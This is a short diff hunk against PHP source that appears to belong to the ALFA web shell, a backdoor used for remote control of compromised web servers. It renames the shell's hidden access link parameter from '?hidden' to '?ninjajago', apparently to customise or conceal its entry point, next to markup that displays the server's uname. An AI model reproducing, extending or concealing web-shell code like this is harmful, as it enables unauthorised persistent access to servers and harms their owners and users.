@@ -1462,7 +1462,7 @@ echo '<input type="hidden" name="alfa'.$s.'">';
 }
 echo '<input type="hidden" name="charset">
 </form>
-<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?hidden"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
+<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?ninjajago"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
 <div class="header"><table width="100%" border="0">
 <tr>
 <td width="3%"><span class="header_vars">Uname:</span></td>
